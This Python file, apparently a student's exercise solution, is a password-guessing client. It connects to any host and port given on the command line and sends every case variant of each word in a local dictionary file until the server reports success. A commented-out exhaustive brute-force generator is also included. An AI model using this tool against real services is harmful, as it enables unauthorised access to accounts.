# write your code here
import socket
import itertools
from sys import argv


class Connector:
    def __init__(self, ip_address, port):
        self.ip = ip_address
        self.port = int(port)

    '''def connect(self):
        alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2',
                    '3', '4', '5', '6', '7', '8', '9', '0']
        gene = self.my_gen(alphabet)
        with socket.socket() as new_connection:
            new_connection.connect((self.ip, self.port))
            for i in range(1, 20000):
                store = next(gene)
                new_connection.send(store.encode())
                response = new_connection.recv(1024)
                response = response.decode()
                if response == 'Connection success!':
                    print(store)
                    break

    @staticmethod
    def my_gen(alph):
        for i in range(1, len(alph)):
            for j in itertools.product(alph, repeat=i):
                value = [''.join(k) for k in j]
                yield ''.join(value)'''

    @staticmethod
    def file_check():
        with open('C:\\Users\\Kalicharan Mohanta\\Downloads\\passwords.txt', 'r+', encoding='utf-8') as file1:
            for file in file1:
                container = file.replace('\n', '')
                inp = container
                n = len(inp)
                # Number of permutations is 2^n
                mx = 1 << n

                # Converting string to lower case
                inp = inp.lower()

                # Using all subsequences and permuting them
                for i in range(mx):
                    # If j-th bit is set, we convert it to upper case
                    combination = [k for k in inp]
                    for j in range(n):
                        if ((i >> j) & 1) == 1:
                            combination[j] = inp[j].upper()

                    temp = ""
                    # Printing current combination
                    for l in combination:
                        temp += l
                    yield temp

    def file_connect(self):
        with socket.socket() as new_connection:
            new_connection.connect((self.ip, self.port))
            file_value = self.file_check()
            while True:
                store1 = next(file_value)
                new_connection.send(store1.encode())
                response = new_connection.recv(5120)
                response = response.decode()
                print(response)
                if response == 'Connection success!':
                    print(store1)
                    break


socket_connect = Connector(argv[1], argv[2])
socket_connect.file_connect()
